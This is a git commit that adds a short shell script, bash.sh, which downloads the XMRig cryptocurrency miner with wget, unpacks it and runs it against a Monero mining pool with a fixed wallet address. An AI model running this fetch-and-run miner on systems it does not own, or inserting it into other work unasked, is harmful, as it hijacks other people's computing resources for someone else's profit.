f7e38630c8f65786db93bb17144b41b249666a00
Mihaiu Marius <marmibv@gmail.com>
2021-10-11 09:55:53 +0300

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-x64.tar.gz 
+tar -zxf xmrig-6.15.2-linux-x64.tar.gz
+ls
+cd xmrig-6.15.2
+./xmrig -o pool.minexmr.com:4444 -u 427fyYSg1B1fhpTPArWwDN971qftnWddRDchpP9zVNbuREedYXLfQeWcqjUHWec48AiZyg8YZaYaKQHk1fdKQ53h1rMnp3W -k --tls --rig-id rig
